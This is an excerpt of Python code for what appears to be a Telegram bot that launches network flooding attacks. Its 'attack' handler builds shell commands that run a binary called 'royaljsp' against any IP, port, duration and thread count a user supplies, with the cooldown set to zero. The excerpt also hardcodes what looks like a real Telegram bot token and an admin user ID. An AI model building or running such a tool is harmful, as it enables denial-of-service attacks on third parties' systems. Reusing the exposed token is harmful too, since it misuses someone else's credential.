...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '7698308538:AAEvOjKBPnHdiClsWwHPnh5_zb8p-ON_SaU'
ADMIN_USER_ID = 6155412817 
COOLDOWN_PERIOD = timedelta(minutes=0) 
...
async def attack(update: Update, context: CallbackContext):
    ...
    if argument_type == 3:
        attack_command = f"./royaljsp {ip} {port} {duration}"
    elif argument_type == 4:
        attack_command = f"./royaljsp {ip} {port} {duration} {threads}"
    elif argument_type == 5:
        attack_command = f"./royaljsp {ip} {port} {duration} {byte_size} {threads}"
